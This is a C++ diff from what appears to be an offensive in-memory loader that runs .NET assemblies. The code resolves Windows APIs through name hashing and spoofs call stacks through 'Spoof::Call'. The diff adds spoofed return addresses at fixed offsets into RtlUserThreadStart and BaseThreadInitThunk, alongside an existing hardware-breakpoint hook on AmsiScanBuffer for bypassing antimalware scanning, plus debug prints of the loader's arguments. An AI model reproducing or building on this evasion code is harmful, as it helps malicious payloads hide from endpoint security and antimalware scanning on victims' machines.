@@ -308,12 +308,16 @@ auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
         return (UPTR)Instance->Win32.LoadLibraryA( LibName );
     }
 
+    Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);
+
     return (UPTR)Spoof::Call( (UPTR)( Instance->Win32.LoadLibraryA ), 0, (UPTR)LibName );
 }
 
 auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
     UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
+
+    Instance->Win32.Ntdll = Ntdll;
     
     Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
     Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));
@@ -358,6 +362,9 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.RtlUserThreadStart     = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
     Instance->Win32.BaseThreadInitThunk    = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));
 
+    Instance->Spf.First.Ptr  = (PVOID)( (UPTR)Instance->Win32.RtlUserThreadStart  + 0x21 );
+    Instance->Spf.Second.Ptr = (PVOID)( (UPTR)Instance->Win32.BaseThreadInitThunk + 0x14 );
+
     Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
     Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
     
@@ -393,7 +400,6 @@ auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
     Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));
 
     Instance->Hwbp.AmsiScanBuffer = (PVOID)LoadApi(Amsi, HashStr("AmsiScanBuffer"));
-
 }
 
 EXTERN_C
@@ -424,6 +430,10 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     CHAR* AppDomain = Parser::Str( &Psr );
     CHAR* FmVersion = Parser::Str( &Psr );
     ULONG KeepLoad  = Parser::Int32( &Psr );
+
+    Instance.Win32.DbgPrint("arg: %s\n", Arguments);
+    Instance.Win32.DbgPrint("app: %s\n", AppDomain);
+    Instance.Win32.DbgPrint("fv: %s\n", FmVersion);
     
     ULONG AppDomainL = (Str::LengthA( AppDomain ) + 1) * sizeof( WCHAR );
     ULONG VersionL   = (Str::LengthA( FmVersion ) + 1) * sizeof( WCHAR );
